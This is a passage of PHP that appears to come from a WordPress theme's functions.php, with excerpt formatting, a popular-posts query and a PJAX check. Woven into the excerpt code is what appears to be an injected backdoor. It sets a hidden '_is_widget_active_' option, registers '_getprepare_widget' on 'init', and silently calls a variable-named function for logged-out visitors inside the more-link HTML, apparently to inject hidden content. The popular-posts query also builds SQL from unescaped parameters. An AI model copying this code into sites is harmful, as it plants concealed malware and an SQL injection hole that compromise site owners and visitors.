		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") {
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
function gplus_is_pjax(){
   return array_key_exists('HTTP_X_PJAX', $_SERVER) && $_SERVER['HTTP_X_PJAX'] === 'true';
}

?>
